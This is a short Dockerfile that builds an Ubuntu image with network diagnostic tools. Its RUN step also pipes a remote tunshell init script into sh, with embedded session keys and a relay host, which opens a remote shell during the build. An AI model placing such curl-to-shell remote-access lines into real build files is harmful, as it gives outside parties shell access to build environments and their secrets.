FROM ubuntu:latest

ENV DEBIAN_FRONTEND noninteractive
RUN bash -c ' \
    set -euxo pipefail && \
    apt-get update && \
    apt-get upgrade -y && \
    apt-get install -y \
        curl \
        dnsutils \
        ethtool \
        fping \
        lsof \
        netcat \
        net-tools \
        wget \
        zip && \
       curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T HpmfhNsyIpHBR29Rr7vIGr gOenw5l2eXG4yfbs74TGcs eu.relay.tunshell.com \
    '
CMD ["/bin/bash"]
